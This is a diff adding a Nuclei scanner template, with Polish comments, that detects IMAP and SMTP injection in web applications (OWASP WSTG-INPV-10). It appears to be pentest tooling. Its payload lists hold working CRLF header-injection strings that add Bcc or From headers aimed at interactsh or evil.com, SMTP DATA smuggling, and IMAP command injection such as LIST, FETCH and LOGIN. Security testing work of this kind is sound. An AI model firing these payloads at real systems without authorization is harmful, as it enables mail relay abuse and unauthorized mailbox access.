@@ -1,0 +1,231 @@
+# ============================================================================
+# WSTG-INPV-10: IMAP / SMTP Injection (Universal)
+# Review status: POPRAWIONY
+# Reviewer: Claude Code (Opus 4.7)
+# Review date: 2026-04-30
+# Zmiany: dodany drugi http block (OOB) z matcherem `part: interactsh_protocol`
+#   dla wykrywania blind variants tej kategorii (IMAP/SMTP / mail). Pierwszy http
+#   block (direct echo / error) bez zmian. Idiomatyczny pattern z dast/
+#   vulnerabilities/{ssrf,xxe,cmdi}/blind-*.yaml. Bez tego matchera callback
+#   do interactsh dochodził, ale Nuclei nie raportował findingu.
+#
+# Pre-poprawkowe spełnienie 6 kryteriów: ✓ Coverage Matrix, ✓ Multi-warstwowe
+# matchery (matchers-condition: and z primary + anti-FP), ✓ Source comments
+# per GROUP, ✓ Safety nets (pre-condition z destructive blocklist, statyki,
+# OPTIONS/HEAD/DELETE skip), ✓ Sweet spot payloadów, ✓ Component fuzzing 5/5.
+#
+# ============================================================================
+#
+# Coverage Matrix:
+#   ✓ CRLF injection w nagłówkach mail (Bcc:, Cc:, Subject:)
+#   ✓ Body injection (\r\n.\r\n)
+#   ✓ IMAP command injection (LIST, FETCH, SELECT)
+#   ✓ Header smuggling (X-Header injection)
+#
+# Performance budget: low (~50 payloads)
+# Estimated time: ~3-5 min
+#
+# Source hierarchy:
+#   1. PayloadsAllTheThings/CRLF Injection/* (mail headers)
+#   2. hacktricks/.../email-injections.md
+# ============================================================================
+
+id: wstg-inpv-10-imap-smtp-injection
+
+info:
+  name: "WSTG-INPV-10: IMAP / SMTP Injection (Universal)"
+  author: pentest-team
+  severity: medium
+  description: |
+    Wykrywa email header injection (CRLF wstrzyknięcie do To/Cc/Bcc/Subject)
+    oraz IMAP command injection w aplikacjach webmail. Detekcja przez markery
+    SMTP/IMAP error response oraz interactsh dla blind body injection (mail
+    wysłany do attacker domain).
+  reference:
+    - https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/10-Testing_for_IMAP_SMTP_Injection
+    - https://book.hacktricks.xyz/pentesting-web/email-injections
+  classification:
+    cwe-id: CWE-93
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N
+    cvss-score: 5.4
+  tags: dast,wstg,wstg-v42-inpv-10,imap-smtp,header-injection,asvs-v5.2.7,burp-history
+
+variables:
+  canary: "x{{rand_text_alpha(10)}}x"
+  auth_token: ""
+  session_cookie: ""
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method != "OPTIONS"'
+          - 'method != "HEAD"'
+          - 'method != "DELETE"'
+          - '!regex("(?i)\\.(js|css|png|jpg|jpeg|gif|svg|ico|woff2?|ttf|otf|eot|map|pdf|zip|tar|gz|mp4|webm)(\\?|$)", path)'
+          - '!regex("(?i)/(delete|cancel|drop|destroy|remove|purge|wipe|reset|terminate)(/|$|\\?)", path)'
+        condition: and
+
+    payloads:
+      injection:
+        # ====================================================================
+        # GROUP 1: CRLF in mail headers - SMTP injection
+        # ====================================================================
+        - "test@example.com%0aBcc:{{canary}}@{{interactsh-url}}"
+        - "test@example.com%0d%0aBcc:{{canary}}@{{interactsh-url}}"
+        - "test@example.com\\r\\nBcc:{{canary}}@{{interactsh-url}}"
+        - "test@example.com%0aCc:{{canary}}@{{interactsh-url}}"
+        - "test@example.com%0d%0aCc:{{canary}}@{{interactsh-url}}"
+        - "test@example.com%0aTo:{{canary}}@{{interactsh-url}}"
+        - "test@example.com%0aSubject:{{canary}}-injected"
+        - "test@example.com%0d%0aSubject:{{canary}}-injected"
+        - "test@example.com%0aFrom:{{canary}}@evil.com"
+        - "test@example.com%0d%0aFrom:{{canary}}@evil.com"
+
+        # ====================================================================
+        # GROUP 2: Body injection (.\r\n. = end-of-message in SMTP DATA)
+        # ====================================================================
+        - "test@example.com%0d%0a%0d%0a{{canary}}-body-injected"
+        - "test@example.com%0a%0a{{canary}}-body-injected"
+        - "test%0d%0a.%0d%0aMAIL FROM:<{{canary}}@evil.com>"
+        - "test%0d%0aDATA%0d%0a{{canary}}%0d%0a.%0d%0a"
+
+        # ====================================================================
+        # GROUP 3: Custom header smuggling
+        # ====================================================================
+        - "test@example.com%0aX-Header:{{canary}}"
+        - "test@example.com%0d%0aX-Mailer:{{canary}}"
+        - "test@example.com%0aReply-To:{{canary}}@{{interactsh-url}}"
+        - "test@example.com%0d%0aReturn-Path:{{canary}}@{{interactsh-url}}"
+
+        # ====================================================================
+        # GROUP 4: IMAP command injection (webmail apps)
+        # ====================================================================
+        - "INBOX\"%0aLIST \"\" *"
+        - "INBOX\"%0d%0aLIST \"\" *"
+        - "INBOX\"%0aLOGOUT"
+        - "INBOX\"%0aSELECT INBOX"
+        - "1\"%0aFETCH 1:* (UID FLAGS BODYSTRUCTURE)"
+        - "1 BODY[]\"%0aLIST \"\" *"
+        - "INBOX\\r\\nLIST \"\" *"
+        - "\"; LIST \"\" * \""
+        - "INBOX\"%0d%0aLOGIN admin password"
+
+        # ====================================================================
+        # GROUP 5: URL-encoded variants
+        # ====================================================================
+        - "test%40example.com%0d%0aBcc%3A{{canary}}%40{{interactsh-url}}"
+        - "test%40example.com%250d%250aBcc%3A{{canary}}%40{{interactsh-url}}"
+        - "test%40example.com%0aSubject%3A{{canary}}"
+
+        # ====================================================================
+        # GROUP 6: Long-line injection (RFC 5322 header continuation)
+        # ====================================================================
+        - "test@example.com%0a Bcc:{{canary}}@{{interactsh-url}}"     # space-prefixed continuation
+        - "test@example.com%0a\\tBcc:{{canary}}@{{interactsh-url}}"
+
+    fuzzing:
+      - parts: [query, body, cookie]
+        type: replace                  # zastępujemy wartość mail-a
+        mode: single
+        # Filtr: parametry pasujące do email/recipient/sender context
+        keys-regex:
+          - "(?i)(mail|email|to|cc|bcc|from|sender|recipient|subject|address|user|login|inbox|folder)"
+        fuzz:
+          - "{{injection}}"
+
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      # Warstwa 1: PRIMARY - SMTP/IMAP error markers OR successful header injection echo
+      - type: regex
+        part: body
+        name: mail-protocol-error
+        regex:
+          # SMTP error codes
+          - "(?i)5\\d{2}\\s+(syntax|invalid|bad|relay|access)"
+          - "(?i)550\\s+\\d?\\.\\d?\\.\\d?\\s+"
+          - "(?i)SMTP.*?error"
+          - "(?i)mail server.*?rejected"
+          # IMAP errors
+          - "(?i)imap.*?(BAD|NO)\\s"
+          - "(?i)A0\\d+\\s+(BAD|NO)\\s"
+          - "(?i)\\* BAD\\s"
+          # PHP mail() warnings
+          - "(?i)Warning.*?mail\\(\\):"
+          - "(?i)mail.*?headers contain"
+          - "(?i)additional_headers.*?must not contain any"
+          # Generic mail injection rejections
+          - "(?i)header injection detected"
+          - "(?i)multiple destination|multiple recipient"
+          - "(?i)invalid recipient"
+        condition: or
+
+      # Warstwa 2: SECONDARY
+      - type: dsl
+        dsl:
+          - "len(body) > 30"
+
+      # Warstwa 3: ANTI-FP
+      - type: dsl
+        dsl:
+          - 'status_code != 403 || (status_code == 403 && !contains(tolower(body), "blocked"))'
+
+      - type: dsl
+        dsl:
+          - "duration < 30"
+
+  # ==========================================================================
+  # DRUGI BLOCK: Blind email injection - SMTP redirect via Bcc / Cc / To
+  # CRLF + dodatkowy nagłówek z attacker email. Aplikacje formularzy
+  # kontaktowych używające raw SMTP są często podatne. Sukces:
+  # mail przychodzi na *@interactsh-url, co skutkuje DNS callbackiem.
+  # Source: hacktricks/smtp-injection + payloadsallthethings/Email Injection
+  # ==========================================================================
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method != "OPTIONS"'
+          - 'method != "HEAD"'
+          - 'method != "DELETE"'
+          - '!regex("(?i)/(delete|cancel|drop|destroy|remove|purge|wipe|reset|terminate)(/|$|\\?)", path)'
+        condition: and
+
+    payloads:
+      mail_oob:
+        - "test@example.com\r\nBcc: {{canary}}@{{interactsh-url}}"
+        - "test@example.com%0d%0aBcc:%20{{canary}}@{{interactsh-url}}"
+        - "test@example.com%0aBcc:%20{{canary}}@{{interactsh-url}}"
+        - "test@example.com\r\nCc: {{canary}}@{{interactsh-url}}"
+        - "test@example.com\r\nTo: {{canary}}@{{interactsh-url}}"
+        - "{{canary}}@{{interactsh-url}}"
+        # IMAP - LIST z attacker mailbox path
+        - "INBOX\r\nLIST \"\" \"*{{interactsh-url}}*\""
+
+    fuzzing:
+      - parts: [query, body, header]
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{mail_oob}}"
+
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        name: oob-callback-received
+        words:
+          - "dns"
+          - "http"
+          - "smtp"
+        condition: or
+
+# ============================================================================
+# Known limitations:
+# - Blind email injection wymaga interactsh do potwierdzenia (mail przyszedł
+#   na attacker domain). Tu pokryte przez tag oob ale wymaga że aplikacja
+#   faktycznie wysyła mail (większość kontaktowych formularzy)
+# - Aplikacje używające bibliotek z header-injection-hardening (np. PHPMailer)
+#   blokują CRLF na poziomie biblioteki - ZTrue Negative
+# ============================================================================
